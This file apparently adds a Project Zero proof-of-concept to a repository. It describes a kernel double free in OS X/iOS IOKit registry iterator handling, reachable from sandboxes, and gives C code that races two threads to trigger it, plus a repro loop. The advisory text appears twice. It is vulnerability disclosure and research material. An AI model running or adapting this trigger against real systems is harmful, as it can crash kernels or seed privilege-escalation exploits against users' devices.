@@ -1,0 +1,162 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=598
+
+The userspace MIG wrapper IORegistryIteratorExitEntry invokes the following kernel function:
+
+    kern_return_t is_io_registry_iterator_exit_entry(
+                                                     io_object_t iterator )
+    {
+        bool  didIt;
+        
+        CHECK( IORegistryIterator, iterator, iter );
+        
+        didIt = iter->exitEntry();
+        
+        return( didIt ? kIOReturnSuccess : kIOReturnNoDevice );
+    }
+
+exitExtry is defined as follows:
+
+bool IORegistryIterator::exitEntry( void )
+{
+    IORegCursor * gone;
+    
+    if( where->iter) {
+        where->iter->release();
+        where->iter = 0;
+        if( where->current)// && (where != &start))
+            where->current->release();
+    }
+    
+    if( where != &start) {
+        gone = where;
+        where = gone->next;
+        IOFree( gone, sizeof(IORegCursor));
+        return( true);
+        
+    } else
+        return( false);
+}
+
+There are multiple concurrency hazards here; for example a double free of where if two threads
+enter at the same time.
+
+These registry APIs aren't protected by MAC hooks therefore this bug can be reached from all sandboxes
+on OS X and iOS.
+
+Tested on El Capitan 10.10.1 15b42 on MacBookAir 5,2
+
+Use kernel zone poisoning and corruption checked with the -zc and -zp boot args to repro
+
+repro: while true; do ./ioparallel_regiter; done
+
+*/
+
+// ianbeer
+
+// clang -o ioparallel_regiter ioparallel_regiter.c -lpthread -framework IOKit
+/*
+OS X and iOS kernel double free due to lack of locking in iokit registry iterator manipulation
+
+The userspace MIG wrapper IORegistryIteratorExitEntry invokes the following kernel function:
+
+    kern_return_t is_io_registry_iterator_exit_entry(
+                                                     io_object_t iterator )
+    {
+        bool  didIt;
+        
+        CHECK( IORegistryIterator, iterator, iter );
+        
+        didIt = iter->exitEntry();
+        
+        return( didIt ? kIOReturnSuccess : kIOReturnNoDevice );
+    }
+
+exitExtry is defined as follows:
+
+bool IORegistryIterator::exitEntry( void )
+{
+    IORegCursor * gone;
+    
+    if( where->iter) {
+        where->iter->release();
+        where->iter = 0;
+        if( where->current)// && (where != &start))
+            where->current->release();
+    }
+    
+    if( where != &start) {
+        gone = where;
+        where = gone->next;
+        IOFree( gone, sizeof(IORegCursor));
+        return( true);
+        
+    } else
+        return( false);
+}
+
+There are multiple concurrency hazards here; for example a double free of where if two threads
+enter at the same time.
+
+These registry APIs aren't protected by MAC hooks therefore this bug can be reached from all sandboxes
+on OS X and iOS.
+
+Tested on El Capitan 10.10.1 15b42 on MacBookAir 5,2
+
+Use kernel zone poisoning and corruption checked with the -zc and -zp boot args to repro
+
+repro: while true; do ./ioparallel_regiter; done
+*/ 
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+int start = 0;
+
+void exit_it(io_iterator_t iter) {
+  IORegistryIteratorExitEntry(iter);
+}
+
+void go(void* arg){
+
+  while(start == 0){;}
+
+  usleep(1);
+
+  exit_it(*(io_iterator_t*)arg);
+}
+
+int main(int argc, char** argv) {
+  kern_return_t err;
+  io_iterator_t iter;
+
+  err = IORegistryCreateIterator(kIOMasterPortDefault, kIOServicePlane, 0, &iter);
+  if (err != KERN_SUCCESS) {
+    printf("can't create reg iterator\n");
+    return 0;
+  }
+
+  IORegistryIteratorEnterEntry(iter);
+
+  pthread_t t;
+  io_connect_t arg = iter;
+  pthread_create(&t, NULL, (void*) go, (void*) &arg);
+
+  usleep(100000);
+
+  start = 1;
+
+  exit_it(iter);
+
+  pthread_join(t, NULL);
+
+  return 0;
+}
